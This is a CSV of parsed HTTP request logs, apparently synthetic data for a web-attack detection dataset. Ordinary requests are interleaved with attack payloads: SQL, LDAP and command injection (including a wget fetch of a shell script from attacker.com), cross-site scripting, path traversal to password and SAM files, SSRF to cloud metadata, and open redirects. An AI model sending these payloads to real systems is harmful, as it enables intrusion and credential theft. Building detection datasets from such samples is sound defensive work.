source_ip,timestamp,raw_url,scheme,host,port,effective_port,path,path_segments,path_depth,query_string,query_params,query_param_count,fragment,file_extension,method,status_code,user_agent,referrer,source
10.0.0.119,2026-04-07T07:48:25.429495,https://admin.example.com/terms,https,admin.example.com,,443,/terms,terms,1,,,0,,,HEAD,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.168,2026-04-07T07:48:25.429495,https://test-app.local/file?include=../../../var/log/auth.log,https,test-app.local,,443,/file,file,1,include=..%2F..%2F..%2Fvar%2Flog%2Fauth.log,include=../../../var/log/auth.log,1,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.147,2026-04-07T07:48:25.430497,http://admin.example.com/news,http,admin.example.com,,80,/news,news,1,,,0,,,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.230,2026-04-07T07:48:25.430497,http://admin.example.com/ldap?uid=%2A%28%29%7C%2526%27,http,admin.example.com,,80,/ldap,ldap,1,uid=%2A%28%29%7C%26%27,uid=*()|&',1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.244,2026-04-07T07:48:25.430497,http://api.example.com/search?limit=10,http,api.example.com,,80,/search,search,1,limit=10,limit=10,1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.110,2026-04-07T07:48:25.431474,https://test-app.local/blog/category/tech?sort=asc,https,test-app.local,,443,/blog/category/tech,blog;category;tech,3,sort=asc,sort=asc,1,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.83,2026-04-07T07:48:25.431474,"https://10.0.0.50/api/message?message='><script>alert(String.fromCharCode(88,83,83))</script>",https,10.0.0.50,,443,/api/message,api;message,2,message=%27%3E%3Cscript%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2Fscript%3E,"message='><script>alert(String.fromCharCode(88,83,83))</script>",1,,,POST,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.103,2026-04-07T07:48:25.431474,http://webapp.internal/css/style.css?q=laptop&brand=apple,http,webapp.internal,,80,/css/style.css,css;style.css,2,q=laptop&brand=apple,q=laptop;brand=apple,2,,css,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.35,2026-04-07T07:48:25.431474,https://admin.example.com/about?order=name&page=1&status=active,https,admin.example.com,,443,/about,about,1,order=name&page=1&status=active,order=name;page=1;status=active,3,,,GET,,PostmanRuntime/7.35.0,,pcap
192.168.1.67,2026-04-07T07:48:25.432451,http://shop.example.com/goto?target=https%3A%2F%2Flegitimate.com.evil.com,http,shop.example.com,,80,/goto,goto,1,target=https%3A%2F%2Flegitimate.com.evil.com,target=https://legitimate.com.evil.com,1,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.26,2026-04-07T07:48:25.432451,http://webapp.internal/api/products?brand=apple&order=name&from=2024-01-01,http,webapp.internal,,80,/api/products,api;products,2,brand=apple&order=name&from=2024-01-01,brand=apple;order=name;from=2024-01-01,3,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.70,2026-04-07T07:48:25.432451,https://api.example.com/terms,https,api.example.com,,443,/terms,terms,1,,,0,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.232,2026-04-07T07:48:25.433427,https://webapp.internal/tools?host=test&&,https,webapp.internal,,443,/tools,tools,1,host=test,host=test,1,,,POST,,sqlmap/1.7.12#dev,,pcap
192.168.1.40,2026-04-07T07:48:25.433427,http://example.com/api/orders?category=electronics,http,example.com,,80,/api/orders,api;orders,2,category=electronics,category=electronics,1,,,POST,,PostmanRuntime/7.35.0,,pcap
192.168.1.37,2026-04-07T07:48:25.433427,http://secure.example.com/directory?uid=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A,http,secure.example.com,,80,/directory,directory,1,uid=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A,uid=*)(uid=*))(|(uid=*,1,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.198,2026-04-07T07:48:25.434404,https://api.example.com/feedback?name=<script>alert('XSS')</script>,https,api.example.com,,443,/feedback,feedback,1,name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,name=<script>alert('XSS')</script>,1,,,POST,,nuclei,,pcap
192.168.1.180,2026-04-07T07:48:25.434404,http://api.example.com/out?return=https%3A%2F%2Fevil.com%40legitimate.com,http,api.example.com,,80,/out,out,1,return=https%3A%2F%2Fevil.com%40legitimate.com,return=https://evil.com@legitimate.com,1,,,GET,,python-requests/2.31.0,,pcap
172.16.0.170,2026-04-07T07:48:25.434404,https://192.168.1.100/blog/post/1,https,192.168.1.100,,443,/blog/post/1,blog;post;1,3,,,0,,,POST,,python-requests/2.31.0,,pcap
192.168.1.171,2026-04-07T07:48:25.435380,http://test-app.local/login,http,test-app.local,,80,/login,login,1,,,0,,,HEAD,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.133,2026-04-07T07:48:25.435380,https://shop.example.com/fetch?path=http%3A%2F%2F0.0.0.0%2F,https,shop.example.com,,443,/fetch,fetch,1,path=http%3A%2F%2F0.0.0.0%2F,path=http://0.0.0.0/,1,,,GET,,ZAP/2.14.0,,pcap
192.168.1.74,2026-04-07T07:48:25.435380,https://api.example.com/admin?q=%27%3B%20EXEC%20xp_cmdshell%28%27dir%27%29--,https,api.example.com,,443,/admin,admin,1,q=%27%3B%20EXEC%20xp_cmdshell%28%27dir%27%29--,q='; EXEC xp_cmdshell('dir')--,1,,,POST,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.175,2026-04-07T07:48:25.435380,http://10.0.0.50/api/execute?exec=test;,http,10.0.0.50,,80,/api/execute,api;execute,2,exec=test%3B,exec=test;,1,,,POST,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.33,2026-04-07T07:48:25.435380,http://webapp.internal/api/users?q=',http,webapp.internal,,80,/api/users,api;users,2,q=%27,q=',1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.106,2026-04-07T07:48:25.436887,http://admin.example.com/news?order=name&sort=asc,http,admin.example.com,,80,/news,news,1,order=name&sort=asc,order=name;sort=asc,2,,,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.50,2026-04-07T07:48:25.437436,http://test-app.local/admin/run?run=test%26%26%20wget%20http%3A%2F%2Fattacker.com%2Fshell.sh,http,test-app.local,,80,/admin/run,admin;run,2,run=test%26%26%20wget%20http%3A%2F%2Fattacker.com%2Fshell.sh,run=test&& wget http://attacker.com/shell.sh,1,,,POST,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.81,2026-04-07T07:48:25.437436,https://admin.example.com/search?search=%27%20OR%20%271%27%3D%271%27%20--,https,admin.example.com,,443,/search,search,1,search=%27%20OR%20%271%27%3D%271%27%20--,search=' OR '1'='1' --,1,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.84,2026-04-07T07:48:25.437436,https://api.example.com/profile,https,api.example.com,,443,/profile,profile,1,,,0,,,POST,,PostmanRuntime/7.35.0,,pcap
172.16.0.206,2026-04-07T07:48:25.438419,https://shop.example.com/products?search=',https,shop.example.com,,443,/products,products,1,search=%27,search=',1,,,GET,,nikto/2.5.0,,pcap
10.0.0.37,2026-04-07T07:48:25.438419,https://10.0.0.50/dashboard?limit=10,https,10.0.0.50,,443,/dashboard,dashboard,1,limit=10,limit=10,1,,,HEAD,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.243,2026-04-07T07:48:25.438419,https://192.168.1.100/login?id=1',https,192.168.1.100,,443,/login,login,1,id=1%27,id=1',1,,,POST,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.4,2026-04-07T07:48:25.439400,https://secure.example.com/blog/post/1?view=list&sort=asc&limit=10,https,secure.example.com,,443,/blog/post/1,blog;post;1,3,view=list&sort=asc&limit=10,view=list;sort=asc;limit=10,3,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.236,2026-04-07T07:48:25.439400,http://10.0.0.50/api/message?q=<img,http,10.0.0.50,,80,/api/message,api;message,2,q=%3Cimg,q=<img,1,,,GET,,curl/8.4.0,,pcap
172.16.0.47,2026-04-07T07:48:25.439400,https://test-app.local/api/v2/data?lang=en&id=123&q=laptop,https,test-app.local,,443,/api/v2/data,api;v2;data,3,lang=en&id=123&q=laptop,lang=en;id=123;q=laptop,3,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.99,2026-04-07T07:48:25.440378,http://api.example.com/download/..;/..;/..;/etc/passwd,http,api.example.com,,80,/download/..;/..;/..;/etc/passwd,download;..;;..;;..;;etc;passwd,6,,,0,,,GET,,nikto/2.5.0,,pcap
192.168.1.46,2026-04-07T07:48:25.440378,https://webapp.internal/api/users?id=',https,webapp.internal,,443,/api/users,api;users,2,id=%27,id=',1,,,POST,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.142,2026-04-07T07:48:25.440378,http://api.example.com/search?query=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,http,api.example.com,,80,/search,search,1,query=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,query=<input onfocus=alert(1) autofocus>,1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.11,2026-04-07T07:48:25.441353,http://10.0.0.50/blog/category/tech?lang=en,http,10.0.0.50,,80,/blog/category/tech,blog;category;tech,3,lang=en,lang=en,1,,,POST,,PostmanRuntime/7.35.0,,pcap
172.16.0.162,2026-04-07T07:48:25.441353,http://192.168.1.100/blog/category/tech,http,192.168.1.100,,80,/blog/category/tech,blog;category;tech,3,,,0,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.139,2026-04-07T07:48:25.441353,http://shop.example.com/register?q=laptop&brand=apple&from=2024-01-01,http,shop.example.com,,80,/register,register,1,q=laptop&brand=apple&from=2024-01-01,q=laptop;brand=apple;from=2024-01-01,3,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.107,2026-04-07T07:48:25.442331,http://10.0.0.50/blog/post/1?view=list&from=2024-01-01,http,10.0.0.50,,80,/blog/post/1,blog;post;1,3,view=list&from=2024-01-01,view=list;from=2024-01-01,2,,,HEAD,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.32,2026-04-07T07:48:25.442331,https://192.168.1.100/,https,192.168.1.100,,443,/,,0,,,0,,,HEAD,,python-requests/2.31.0,,pcap
192.168.1.174,2026-04-07T07:48:25.442331,https://api.example.com/blog/post/1?status=active&lang=en&view=list,https,api.example.com,,443,/blog/post/1,blog;post;1,3,status=active&lang=en&view=list,status=active;lang=en;view=list,3,,,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.37,2026-04-07T07:48:25.443309,http://secure.example.com/proxy?path=http%3A%2F%2F2130706433%2F,http,secure.example.com,,80,/proxy,proxy,1,path=http%3A%2F%2F2130706433%2F,path=http://2130706433/,1,,,GET,,nikto/2.5.0,,pcap
192.168.1.99,2026-04-07T07:48:25.443309,http://secure.example.com/lookup?filter=x%29%28%7C%28cn%3D%2A%29,http,secure.example.com,,80,/lookup,lookup,1,filter=x%29%28%7C%28cn%3D%2A%29,filter=x)(|(cn=*),1,,,GET,,PostmanRuntime/7.35.0,,pcap
10.0.0.219,2026-04-07T07:48:25.443309,http://webapp.internal/terms?user=john&sort=asc,http,webapp.internal,,80,/terms,terms,1,user=john&sort=asc,user=john;sort=asc,2,,,GET,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
192.168.1.186,2026-04-07T07:48:25.444283,http://admin.example.com/api/v1/status?page=1&view=list,http,admin.example.com,,80,/api/v1/status,api;v1;status,3,page=1&view=list,page=1;view=list,2,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.196,2026-04-07T07:48:25.444283,"https://shop.example.com/profile?q='><script>alert(String.fromCharCode(88,83,83))</script>",https,shop.example.com,,443,/profile,profile,1,q=%27%3E%3Cscript%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2Fscript%3E,"q='><script>alert(String.fromCharCode(88,83,83))</script>",1,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.96,2026-04-07T07:48:25.445259,http://admin.example.com/proxy?target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,http,admin.example.com,,80,/proxy,proxy,1,target=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,target=http://169.254.169.254/latest/meta-data/,1,,,GET,,nuclei,,pcap
172.16.0.202,2026-04-07T07:48:25.445259,https://webapp.internal/api/v1/health?view=list,https,webapp.internal,,443,/api/v1/health,api;v1;health,3,view=list,view=list,1,,,GET,,curl/8.4.0,,pcap
172.16.0.25,2026-04-07T07:48:25.445259,https://192.168.1.100/lookup?user=admin%29%28%7C%28password%3D%2A%29%29,https,192.168.1.100,,443,/lookup,lookup,1,user=admin%29%28%7C%28password%3D%2A%29%29,user=admin)(|(password=*)),1,,,GET,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.75,2026-04-07T07:48:25.445259,http://api.example.com/terms,http,api.example.com,,80,/terms,terms,1,,,0,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.43,2026-04-07T07:48:25.445259,http://192.168.1.100/terms?q=laptop,http,192.168.1.100,,80,/terms,terms,1,q=laptop,q=laptop,1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.82,2026-04-07T07:48:25.446763,https://admin.example.com/redirect?next=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,https,admin.example.com,,443,/redirect,redirect,1,next=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,next=/redirect?url=http://evil.com,1,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.219,2026-04-07T07:48:25.446763,http://api.example.com/terms?limit=10&type=product,http,api.example.com,,80,/terms,terms,1,limit=10&type=product,limit=10;type=product,2,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.72,2026-04-07T07:48:25.446763,http://secure.example.com/lookup?target=test%7C%20base64%20%2Fetc%2Fpasswd,http,secure.example.com,,80,/lookup,lookup,1,target=test%7C%20base64%20%2Fetc%2Fpasswd,target=test| base64 /etc/passwd,1,,,GET,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.123,2026-04-07T07:48:25.446763,http://test-app.local/notifications?status=active,http,test-app.local,,80,/notifications,notifications,1,status=active,status=active,1,,,POST,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.157,2026-04-07T07:48:25.447781,http://10.0.0.50/goto?url=https%3A%2F%2Fevil.com%40legitimate.com,http,10.0.0.50,,80,/goto,goto,1,url=https%3A%2F%2Fevil.com%40legitimate.com,url=https://evil.com@legitimate.com,1,,,GET,,gobuster/3.6,,pcap
10.0.0.31,2026-04-07T07:48:25.447781,http://10.0.0.50/?from=2024-01-01,http,10.0.0.50,,80,/,,0,from=2024-01-01,from=2024-01-01,1,,,POST,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
10.0.0.231,2026-04-07T07:48:25.448763,http://test-app.local/load?src=http%3A%2F%2F0.0.0.0%2F,http,test-app.local,,80,/load,load,1,src=http%3A%2F%2F0.0.0.0%2F,src=http://0.0.0.0/,1,,,GET,,nikto/2.5.0,,pcap
172.16.0.177,2026-04-07T07:48:25.448763,http://shop.example.com/register?category=electronics&id=123&q=laptop,http,shop.example.com,,80,/register,register,1,category=electronics&id=123&q=laptop,category=electronics;id=123;q=laptop,3,,,HEAD,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.66,2026-04-07T07:48:25.448763,https://secure.example.com/css/style.css?status=active&lang=en&page=1,https,secure.example.com,,443,/css/style.css,css;style.css,2,status=active&lang=en&page=1,status=active;lang=en;page=1,3,,css,HEAD,,python-requests/2.31.0,,pcap
10.0.0.70,2026-04-07T07:48:25.448763,http://192.168.1.100/api/users,http,192.168.1.100,,80,/api/users,api;users,2,,,0,,,POST,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.63,2026-04-07T07:48:25.449744,http://shop.example.com/api/v1/health?limit=10&lang=en&filter=recent,http,shop.example.com,,80,/api/v1/health,api;v1;health,3,limit=10&lang=en&filter=recent,limit=10;lang=en;filter=recent,3,,,POST,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.131,2026-04-07T07:48:25.449744,http://webapp.internal/search?search=%3Cdiv%20style%3D%22background%3Aurl%28%27javascript%3Aalert%281%29%27%29%22%3E,http,webapp.internal,,80,/search,search,1,search=%3Cdiv%20style%3D%22background%3Aurl%28%27javascript%3Aalert%281%29%27%29%22%3E,"search=<div style=""background:url('javascript:alert(1)')"">",1,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.10,2026-04-07T07:48:25.449744,http://example.com/events?order=name&view=list,http,example.com,,80,/events,events,1,order=name&view=list,order=name;view=list,2,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.101,2026-04-07T07:48:25.450721,http://test-app.local/?brand=apple,http,test-app.local,,80,/,,0,brand=apple,brand=apple,1,,,POST,,PostmanRuntime/7.35.0,,pcap
172.16.0.217,2026-04-07T07:48:25.450721,https://api.example.com/download/..\..\..\windows\system32\config\sam,https,api.example.com,,443,/download/..\..\..\windows\system32\config\sam,download;..\..\..\windows\system32\config\sam,2,,,0,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.245,2026-04-07T07:48:25.450721,http://webapp.internal/api/execute?ip=test%3B%20ping%20-c%2010%20attacker.com,http,webapp.internal,,80,/api/execute,api;execute,2,ip=test%3B%20ping%20-c%2010%20attacker.com,ip=test; ping -c 10 attacker.com,1,,,GET,,masscan/1.3,,pcap
192.168.1.96,2026-04-07T07:48:25.451697,http://admin.example.com/faq,http,admin.example.com,,80,/faq,faq,1,,,0,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.62,2026-04-07T07:48:25.451697,http://secure.example.com/api/fetch?src=http%3A%2F%2Flocaltest.me%2F,http,secure.example.com,,80,/api/fetch,api;fetch,2,src=http%3A%2F%2Flocaltest.me%2F,src=http://localtest.me/,1,,,GET,,ZAP/2.14.0,,pcap
172.16.0.70,2026-04-07T07:48:25.451697,https://test-app.local/contact?view=list,https,test-app.local,,443,/contact,contact,1,view=list,view=list,1,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.158,2026-04-07T07:48:25.452673,https://192.168.1.100/privacy?filter=recent,https,192.168.1.100,,443,/privacy,privacy,1,filter=recent,filter=recent,1,,,HEAD,,python-requests/2.31.0,,pcap
172.16.0.114,2026-04-07T07:48:25.452673,http://secure.example.com/events?order=name&filter=recent&limit=10,http,secure.example.com,,80,/events,events,1,order=name&filter=recent&limit=10,order=name;filter=recent;limit=10,3,,,GET,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.152,2026-04-07T07:48:25.452673,http://shop.example.com/load?uri=http%3A%2F%2Flocaltest.me%2F,http,shop.example.com,,80,/load,load,1,uri=http%3A%2F%2Flocaltest.me%2F,uri=http://localtest.me/,1,,,GET,,curl/8.4.0,,pcap
10.0.0.100,2026-04-07T07:48:25.452673,http://shop.example.com/privacy,http,shop.example.com,,80,/privacy,privacy,1,,,0,,,GET,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.165,2026-04-07T07:48:25.453650,http://secure.example.com/terms?type=product&filter=recent&limit=10,http,secure.example.com,,80,/terms,terms,1,type=product&filter=recent&limit=10,type=product;filter=recent;limit=10,3,,,GET,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
